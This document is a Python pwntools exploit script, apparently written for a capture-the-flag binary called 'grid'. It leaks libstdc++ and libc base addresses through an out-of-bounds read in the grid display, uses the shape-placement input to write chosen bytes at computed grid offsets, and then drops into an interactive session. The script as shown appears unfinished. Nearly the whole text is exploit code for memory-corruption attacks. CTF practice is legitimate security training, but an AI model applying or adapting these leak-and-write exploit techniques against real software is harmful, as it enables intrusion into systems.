#!/usr/bin/env python3

from pwn import *

_FILE = "./grid"

binary = context.binary = ELF(_FILE, checksec=False)
_LIBC = binary.libc
_LIBC_STDC = ELF("./libstdc.so.6.0.25")

print([x for x in _LIBC_STDC.sym if "sentry" in x])


if args.GDB:
    p = gdb.debug(binary.path, gdbscript="\nb *0x400d8e\nc\n")
else:
    p = process(_FILE) #, env={"LD_PRELOAD": "./libc-2.27.so:./libstdc.so.6.0.25"})


def shape(s: bytes, loc1: bytes, loc2: bytes):
    p.sendline(s)
    p.recvuntil("loc> ")
    p.sendline(loc1)
    p.sendline(loc2)
    return p.recvline().decode("latin-1")

def print_grid():
    p.sendline("d")
    p.recvuntil("Displaying\n")
    return p.clean().decode("latin-1")

def leak_libcstdc():
    p.sendline("d")
    p.recvuntil("Displaying\n")
    return u64(p.recvuntil("shape> ")[26:32].ljust(8, b"\x00"))-335-_LIBC_STDC.sym['_ZNSi6sentryC2ERSib'] #.decode("latin-1"))

leak_libcstdc_addr = leak_libcstdc()
_LIBC.address = leak_libcstdc_addr - 0x1b7ae0 - _LIBC.sym['__libc_start_main']

log.info(f"Libcstdc  address: {hex(leak_libcstdc_addr)}")
log.info(f"Libc leak address: {hex(_LIBC.address)}")


addr = p64(_LIBC.address)[::-1] + b"B"*8
addr = addr.decode("latin-1")
i = 0
for _ in range(16, 0, -1):
    shape(addr[i], str(0), str(127-i))
    i += 1

grid = print_grid()
print(grid)

p.interactive()
